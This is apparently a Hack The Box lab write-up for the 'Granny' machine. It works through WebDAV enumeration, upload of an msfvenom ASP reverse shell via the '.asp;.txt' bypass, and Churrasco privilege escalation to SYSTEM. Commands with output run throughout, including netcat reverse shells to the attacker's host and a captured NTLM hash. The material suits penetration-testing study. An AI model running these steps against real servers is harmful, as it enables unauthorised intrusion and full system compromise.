# Hackthebox Granny

## Enumeration

Port enumeration to begin with

```
$ sudo nmap -A -T4 -p- 10.129.179.184
Starting Nmap 7.91 ( https://nmap.org ) at 2021-12-31 07:16 EST
Nmap scan report for 10.129.179.184
Host is up (0.035s latency).
Not shown: 65534 filtered ports
PORT   STATE SERVICE VERSION
80/tcp open  http    Microsoft IIS httpd 6.0
| http-methods: 
|_  Potentially risky methods: TRACE DELETE COPY MOVE PROPFIND PROPPATCH SEARCH MKCOL LOCK UNLOCK PUT
|_http-server-header: Microsoft-IIS/6.0
|_http-title: Under Construction
| http-webdav-scan: 
|   Allowed Methods: OPTIONS, TRACE, GET, HEAD, DELETE, COPY, MOVE, PROPFIND, PROPPATCH, SEARCH, MKCOL, LOCK, UNLOCK
|   Server Date: Fri, 31 Dec 2021 12:18:21 GMT
|   Server Type: Microsoft-IIS/6.0
|   Public Options: OPTIONS, TRACE, GET, HEAD, DELETE, PUT, POST, COPY, MOVE, MKCOL, PROPFIND, PROPPATCH, LOCK, UNLOCK, SEARCH
|_  WebDAV type: Unknown
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running (JUST GUESSING): Microsoft Windows 2003|2008|XP|2000 (92%)
OS CPE: cpe:/o:microsoft:windows_server_2003::sp1 cpe:/o:microsoft:windows_server_2003::sp2 cpe:/o:microsoft:windows_server_2008::sp2 cpe:/o:microsoft:windows_xp::sp3 cpe:/o:microsoft:windows_2000::sp4
Aggressive OS guesses: Microsoft Windows Server 2003 SP1 or SP2 (92%), Microsoft Windows Server 2008 Enterprise SP2 (92%), Microsoft Windows Server 2003 SP2 (91%), Microsoft Windows 2003 SP2 (91%), Microsoft Windows XP SP3 (90%), Microsoft Windows 2000 SP4 or Windows XP Professional SP1 (90%), Microsoft Windows XP (87%), Microsoft Windows 2000 SP4 (87%), Microsoft Windows Server 2003 SP1 - SP2 (86%), Microsoft Windows XP SP2 or Windows Server 2003 (86%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
```

Old Microsoft IIS6.0, next enumerate directories and asp-files.

```
$ gobuster dir -u http://10.129.179.184 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x asp,aspx -k -t 50
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.129.179.184
[+] Method:                  GET
[+] Threads:                 50
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Extensions:              aspx,asp
[+] Timeout:                 10s
===============================================================
2021/12/31 07:20:33 Starting gobuster in directory enumeration mode
===============================================================
/images               (Status: 301) [Size: 152] [--> http://10.129.179.184/images/]
/Images               (Status: 301) [Size: 152] [--> http://10.129.179.184/Images/]
/IMAGES               (Status: 301) [Size: 152] [--> http://10.129.179.184/IMAGES/]
```

Run also gobuster with common.txt

```
$ gobuster dir -u http://10.129.179.184 -w /usr/share/wordlists/dirb/common.txt 
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.129.179.184
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirb/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Timeout:                 10s
===============================================================
2021/12/31 07:43:26 Starting gobuster in directory enumeration mode
===============================================================
/_private             (Status: 301) [Size: 156] [--> http://10.129.179.184/%5Fprivate/]
/_vti_bin             (Status: 301) [Size: 158] [--> http://10.129.179.184/%5Fvti%5Fbin/]
/_vti_bin/_vti_adm/admin.dll (Status: 200) [Size: 195]                                   
/_vti_bin/_vti_aut/author.dll (Status: 200) [Size: 195]                                  
/_vti_bin/shtml.dll   (Status: 200) [Size: 96]                                           
/_vti_log             (Status: 301) [Size: 158] [--> http://10.129.179.184/%5Fvti%5Flog/]
/aspnet_client        (Status: 301) [Size: 161] [--> http://10.129.179.184/aspnet%5Fclient/]
/Images               (Status: 301) [Size: 152] [--> http://10.129.179.184/Images/]         
/images               (Status: 301) [Size: 152] [--> http://10.129.179.184/images/]         
                                                                                            
===============================================================
2021/12/31 07:43:42 Finished
===============================================================
```

In addition there were lots of files with status 400 or 500.

## Vulnerability scanning

Standard enum vulnerability scan and specifically also the webdav vulnerability script

```
 nmap --script vuln 10.129.179.184  
Starting Nmap 7.91 ( https://nmap.org ) at 2021-12-31 07:30 EST
Nmap scan report for 10.129.179.184
Host is up (0.037s latency).
Not shown: 999 filtered ports
PORT   STATE SERVICE
80/tcp open  http
|_http-csrf: Couldn't find any CSRF vulnerabilities.
|_http-dombased-xss: Couldn't find any DOM based XSS.
| http-enum: 
|   /_vti_bin/: Frontpage file or folder
|   /_vti_log/: Frontpage file or folder
|   /postinfo.html: Frontpage file or folder
|   /_vti_bin/_vti_aut/author.dll: Frontpage file or folder
|   /_vti_bin/_vti_aut/author.exe: Frontpage file or folder
|   /_vti_bin/_vti_adm/admin.dll: Frontpage file or folder
|   /_vti_bin/_vti_adm/admin.exe: Frontpage file or folder
|   /_vti_bin/fpcount.exe?Page=default.asp|Image=3: Frontpage file or folder
|   /_vti_bin/shtml.dll: Frontpage file or folder
|   /_vti_bin/shtml.exe: Frontpage file or folder
|   /images/: Potentially interesting folder
|_  /_private/: Potentially interesting folder
| http-frontpage-login: 
|   VULNERABLE:
|   Frontpage extension anonymous login
|     State: VULNERABLE
|       Default installations of older versions of frontpage extensions allow anonymous logins which can lead to server compromise.
|       
|     References:
|_      http://insecure.org/sploits/Microsoft.frontpage.insecurities.html
|_http-stored-xss: Couldn't find any stored XSS vulnerabilities.

Nmap done: 1 IP address (1 host up) scanned in 180.63 seconds
                                                                                                                        
┌──(kali㉿kali)-[~/Documents/CTF/hackthebox/Granny]
└─$ nmap --script=http-iis-webdav-vuln 10.129.179.184
Starting Nmap 7.91 ( https://nmap.org ) at 2021-12-31 07:34 EST
Nmap scan report for 10.129.179.184
Host is up (0.039s latency).
Not shown: 999 filtered ports
PORT   STATE SERVICE
80/tcp open  http
|_http-iis-webdav-vuln: WebDAV is ENABLED. No protected folder found; check not run. If you know a protected folder, add --script-args=webdavfolder=<path>
```

Run davtest

```
$ davtest -url http://10.129.179.184    
********************************************************
 Testing DAV connection
OPEN		SUCCEED:		http://10.129.179.184
********************************************************
NOTE	Random string for this session: q3gItoIvDy0FK
********************************************************
 Creating directory
MKCOL		SUCCEED:		Created http://10.129.179.184/DavTestDir_q3gItoIvDy0FK
********************************************************
 Sending test files
PUT	shtml	FAIL
PUT	php	SUCCEED:	http://10.129.179.184/DavTestDir_q3gItoIvDy0FK/davtest_q3gItoIvDy0FK.php
PUT	txt	SUCCEED:	http://10.129.179.184/DavTestDir_q3gItoIvDy0FK/davtest_q3gItoIvDy0FK.txt
PUT	aspx	FAIL
PUT	jhtml	SUCCEED:	http://10.129.179.184/DavTestDir_q3gItoIvDy0FK/davtest_q3gItoIvDy0FK.jhtml
PUT	cfm	SUCCEED:	http://10.129.179.184/DavTestDir_q3gItoIvDy0FK/davtest_q3gItoIvDy0FK.cfm
PUT	html	SUCCEED:	http://10.129.179.184/DavTestDir_q3gItoIvDy0FK/davtest_q3gItoIvDy0FK.html
PUT	pl	SUCCEED:	http://10.129.179.184/DavTestDir_q3gItoIvDy0FK/davtest_q3gItoIvDy0FK.pl
PUT	asp	FAIL
PUT	cgi	FAIL
PUT	jsp	SUCCEED:	http://10.129.179.184/DavTestDir_q3gItoIvDy0FK/davtest_q3gItoIvDy0FK.jsp
********************************************************
 Checking for test file execution
EXEC	php	FAIL
EXEC	txt	SUCCEED:	http://10.129.179.184/DavTestDir_q3gItoIvDy0FK/davtest_q3gItoIvDy0FK.txt
EXEC	jhtml	FAIL
EXEC	cfm	FAIL
EXEC	html	SUCCEED:	http://10.129.179.184/DavTestDir_q3gItoIvDy0FK/davtest_q3gItoIvDy0FK.html
EXEC	pl	FAIL
EXEC	jsp	FAIL

********************************************************
/usr/bin/davtest Summary:
Created: http://10.129.179.184/DavTestDir_q3gItoIvDy0FK
PUT File: http://10.129.179.184/DavTestDir_q3gItoIvDy0FK/davtest_q3gItoIvDy0FK.php
PUT File: http://10.129.179.184/DavTestDir_q3gItoIvDy0FK/davtest_q3gItoIvDy0FK.txt
PUT File: http://10.129.179.184/DavTestDir_q3gItoIvDy0FK/davtest_q3gItoIvDy0FK.jhtml
PUT File: http://10.129.179.184/DavTestDir_q3gItoIvDy0FK/davtest_q3gItoIvDy0FK.cfm
PUT File: http://10.129.179.184/DavTestDir_q3gItoIvDy0FK/davtest_q3gItoIvDy0FK.html
PUT File: http://10.129.179.184/DavTestDir_q3gItoIvDy0FK/davtest_q3gItoIvDy0FK.pl
PUT File: http://10.129.179.184/DavTestDir_q3gItoIvDy0FK/davtest_q3gItoIvDy0FK.jsp
Executes: http://10.129.179.184/DavTestDir_q3gItoIvDy0FK/davtest_q3gItoIvDy0FK.txt
Executes: http://10.129.179.184/DavTestDir_q3gItoIvDy0FK/davtest_q3gItoIvDy0FK.html
```

Connect to webdav using cadaver and see what is in there

```
$ cadaver 10.129.179.184
dav:/> ls
Listing collection `/': succeeded.
Coll:   _private                               0  Apr 12  2017
Coll:   _vti_bin                               0  Apr 12  2017
Coll:   _vti_cnf                               0  Apr 12  2017
Coll:   _vti_log                               0  Apr 12  2017
Coll:   _vti_pvt                               0  Apr 12  2017
Coll:   _vti_script                            0  Apr 12  2017
Coll:   _vti_txt                               0  Apr 12  2017
Coll:   aspnet_client                          0  Apr 12  2017
Coll:   images                                 0  Apr 12  2017
        _vti_inf.html                       1754  Apr 12  2017
        iisstart.htm                        1433  Feb 21  2003
        pagerror.gif                        2806  Feb 21  2003
        postinfo.html                       2440  Apr 12  2017
dav:/> ls _vti_bin
Listing collection `/_vti_bin/': succeeded.
Coll:   _vti_adm                               0  Apr 12  2017
Coll:   _vti_aut                               0  Apr 12  2017
        fpcount.exe                        90112  Feb 18  2007
        shtml.dll                          20480  Feb 18  2007
        srcherr.htx                         4133  Feb 18  2007
dav:/>
```

The same is accessible through a browser.

While we cannot upload .asp files, IIS6.0 WebDav has vulnerability, where files with extension .asp;.txt are executed as normal asp files. Our task is to create a reverse shell, copy it with a proper name to host, and exeute the file to get a shell.

## Initial Access

Meterpreter shell was not stable, so normal tcp reverse shell.

```
$ msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.18 LPORT=1234 -f asp > tcpshell.asp                      130 ⨯
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x86 from the payload
No encoder specified, outputting raw payload
Payload size: 324 bytes
Final size of asp file: 38389 bytes
                                                                                                                        
┌──(kali㉿kali)-[~/…/CTF/hackthebox/Granny/reverse_shell]
└─$ cp tcpshell.asp tcpshell.txt 
                                                                                                                        
┌──(kali㉿kali)-[~/…/CTF/hackthebox/Granny/reverse_shell]
└─$ cadaver 10.129.179.184      
dav:/> put tcpshell.txt
Uploading tcpshell.txt to `/tcpshell.txt':
Progress: [=============================>] 100.0% of 38389 bytes succeeded.
dav:/> copy tcpshell.txt tcpshell.asp;.txt
Copying `/tcpshell.txt' to `/tcpshell.asp%3b.txt':  succeeded.
dav:/>
```

Execute the file through browser, and through our listener we have a shell

```
$ nc -nvlp 1234                                                                    
listening on [any] 1234 ...
connect to [10.10.14.18] from (UNKNOWN) [10.129.179.184] 1039
Microsoft Windows [Version 5.2.3790]
(C) Copyright 1985-2003 Microsoft Corp.

c:\windows\system32\inetsrv>whoami
whoami
nt authority\network service

c:\windows\system32\inetsrv>
```

It seems we don't have access to the user folders, so we have some privilege escalation to do.

## Privilege escalation

Systeminfo to know where we are, and we check also if SeImpersonatePrivilege is enabled

```
C:\Documents and Settings>systeminfo
systeminfo

Host Name:                 GRANNY
OS Name:                   Microsoft(R) Windows(R) Server 2003, Standard Edition
OS Version:                5.2.3790 Service Pack 2 Build 3790
OS Manufacturer:           Microsoft Corporation
OS Configuration:          Standalone Server
OS Build Type:             Uniprocessor Free
Registered Owner:          HTB
Registered Organization:   HTB
Product ID:                69712-296-0024942-44782
Original Install Date:     4/12/2017, 5:07:40 PM
System Up Time:            0 Days, 1 Hours, 53 Minutes, 6 Seconds
System Manufacturer:       VMware, Inc.
System Model:              VMware Virtual Platform
System Type:               X86-based PC
Processor(s):              1 Processor(s) Installed.
                           [01]: x86 Family 23 Model 49 Stepping 0 AuthenticAMD ~2994 Mhz
BIOS Version:              INTEL  - 6040000
Windows Directory:         C:\WINDOWS
System Directory:          C:\WINDOWS\system32
Boot Device:               \Device\HarddiskVolume1
System Locale:             en-us;English (United States)
Input Locale:              en-us;English (United States)
Time Zone:                 (GMT+02:00) Athens, Beirut, Istanbul, Minsk
Total Physical Memory:     1,023 MB
Available Physical Memory: 376 MB
Page File: Max Size:       2,470 MB
Page File: Available:      1,918 MB
Page File: In Use:         552 MB
Page File Location(s):     C:\pagefile.sys
Domain:                    HTB
Logon Server:              N/A
Hotfix(s):                 1 Hotfix(s) Installed.
                           [01]: Q147222
Network Card(s):           N/A

C:\Documents and Settings>whoami /priv
whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                               State   
============================= ========================================= ========
SeAuditPrivilege              Generate security audits                  Disabled
SeIncreaseQuotaPrivilege      Adjust memory quotas for a process        Disabled
SeAssignPrimaryTokenPrivilege Replace a process level token             Disabled
SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled 
SeImpersonatePrivilege        Impersonate a client after authentication Enabled 
SeCreateGlobalPrivilege       Create global objects                     Enabled 

C:\Documents and Settings>
```

### MS09-012 (Churrasco)

The target host had troubles executing exploit binaries stored locally, so this one was done through a shared drive.

Set up an smbserver and see the download

```
$ smbserver.py share .                                                                                                                                      130 ⨯
Impacket v0.9.24 - Copyright 2021 SecureAuth Corporation

[*] Config file parsed
[*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
[*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
[*] Config file parsed
[*] Config file parsed
[*] Config file parsed
[*] Incoming connection (10.129.179.184,1050)
[*] AUTHENTICATE_MESSAGE (HTB\GRANNY$,GRANNY)
[*] User GRANNY\GRANNY$ authenticated successfully
[*] GRANNY$::HTB:0c33f8232c8bad5a00000000000000000000000000000000:59b2e77ef6ccc6814cd1bfd4db50c53d6d407fcf7793a914:aaaaaaaaaaaaaaaa
```

From the target host execute the file without copying it. Note that nc.exe has to be transferred over as well.

```
C:\WINDOWS\Temp>dir c:\windows\temp\nc.exe
dir c:\windows\temp\nc.exe
 Volume in drive C has no label.
 Volume Serial Number is 424C-F32D

 Directory of c:\windows\temp

12/31/2021  04:48 PM            59,392 nc.exe
               1 File(s)         59,392 bytes
               0 Dir(s)   1,218,707,456 bytes free

C:\WINDOWS\Temp>\\10.10.14.18\share\Churrasco.exe "c:\windows\temp\nc.exe 10.10.14.18 6666 -e cmd.exe"
\\10.10.14.18\share\Churrasco.exe "c:\windows\temp\nc.exe 10.10.14.18 6666 -e cmd.exe"
/churrasco/-->Current User: NETWORK SERVICE 
/churrasco/-->Getting Rpcss PID ...
/churrasco/-->Found Rpcss PID: 668 
/churrasco/-->Searching for Rpcss threads ...
/churrasco/-->Found Thread: 672 
/churrasco/-->Thread not impersonating, looking for another thread...
/churrasco/-->Found Thread: 676 
/churrasco/-->Thread not impersonating, looking for another thread...
/churrasco/-->Found Thread: 684 
/churrasco/-->Thread impersonating, got NETWORK SERVICE Token: 0x730
/churrasco/-->Getting SYSTEM token from Rpcss Service...
/churrasco/-->Found NETWORK SERVICE Token
/churrasco/-->Found NETWORK SERVICE Token
/churrasco/-->Found LOCAL SERVICE Token
/churrasco/-->Found SYSTEM token 0x728
/churrasco/-->Running command with SYSTEM Token...
/churrasco/-->Done, command should have ran as SYSTEM!

C:\WINDOWS\Temp>
```

And in our listener we have root

```
$ nc -nvlp 6666                                                                       
listening on [any] 6666 ...
connect to [10.10.14.18] from (UNKNOWN) [10.129.179.184] 1052
Microsoft Windows [Version 5.2.3790]
(C) Copyright 1985-2003 Microsoft Corp.

C:\WINDOWS\Temp>whoami
whoami
nt authority\system

C:\WINDOWS\Temp>
```

And the flags

```
C:\WINDOWS\Temp>dir "C:\Documents and Settings\Lakis\Desktop\user.txt"
dir "C:\Documents and Settings\Lakis\Desktop\user.txt"
 Volume in drive C has no label.
 Volume Serial Number is 424C-F32D

 Directory of C:\Documents and Settings\Lakis\Desktop

04/12/2017  09:20 PM                32 user.txt
               1 File(s)             32 bytes
               0 Dir(s)   1,218,715,648 bytes free

C:\WINDOWS\Temp>dir "C:\Documents and Settings\Administrator\Desktop\root.txt"
dir "C:\Documents and Settings\Administrator\Desktop\root.txt"
 Volume in drive C has no label.
 Volume Serial Number is 424C-F32D

 Directory of C:\Documents and Settings\Administrator\Desktop

04/12/2017  09:17 PM                32 root.txt
               1 File(s)             32 bytes
               0 Dir(s)   1,218,711,552 bytes free

C:\WINDOWS\Temp>
```

